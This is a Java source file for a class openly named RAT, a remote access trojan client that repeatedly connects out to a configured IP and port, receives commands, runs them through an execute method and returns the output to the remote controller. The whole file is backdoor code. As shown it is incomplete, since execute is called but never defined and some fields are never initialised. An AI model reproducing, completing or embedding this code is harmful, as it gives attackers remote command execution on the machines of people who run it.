package connection;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.Scanner;

public class RAT {
	private Socket s;
	private Scanner scan;
	private PrintWriter pr;
	private ProcessBuilder ps;
	private BufferedReader in;
	
	private DataOutputStream dout;
	private DataInputStream din;
	
	private String _ip;
	private int _port;
	
	public RAT(String hostIP, int port) {
		_ip = hostIP;
		_port = port;
	}
	
	public void connect() {
		String received;
		try {
			reset();
		} catch (IOException e1) {
			return;
		}
		while(true)
        {  
			try {
				received = din.readUTF();
				received = received.trim();
				if (received.contains("quit") == true) {
					dout.writeUTF("bye :(");
					dout.flush();
					scan.close();
					s.close();
					return;
				}
				else {
					dout.writeUTF(execute(received));
					dout.flush();
				}
	        } catch (Exception e1) {
	        	try {
	        		reset();
	        	}
	        	catch(IOException e2) {
	        		return;
	        	}
	        }
        }
	}
	
	private void reset() throws IOException {
		while(!initConnection());
		System.gc(); //Calls the garbage collector because of the previous function
		dout = new DataOutputStream(s.getOutputStream());
		din = new DataInputStream(s.getInputStream());
	}
	
	private boolean initConnection() {
        try
        {
            s = new Socket(_ip,_port);
            return true;
        }
        catch(Exception err)
        {
            return false;
        }
           
    }

}
